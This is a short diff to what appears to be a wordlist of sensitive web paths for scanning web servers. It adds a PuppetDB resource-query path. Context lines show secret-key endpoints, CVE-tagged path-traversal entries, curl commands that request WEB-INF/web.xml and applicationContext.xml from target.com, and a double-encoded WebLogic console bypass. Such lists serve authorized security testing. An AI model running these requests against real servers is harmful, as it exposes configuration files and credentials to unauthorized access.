@@ -42,6 +42,7 @@
 /saml
 /awskey
 /metrics
+/pdb/query/v4/resources
 /filepicker_key
 /main.json
 /index.php/admin
@@ -171,4 +172,5 @@
 /../black/    CVE-2017-12637
 .//WEB-INF/web.xml CVE-2022-21371  curl "httpS://target.com/" --request-target ".//WEB-INF/web.xml"
 .//WEB-INF/applicationContext.xml  curl "httpS://target.com/" --request-target ".//WEB-INF/applicationContext.xml"
+
 /console/css/%252e%252e%252fconsole.portal  -> weblogic server bypass
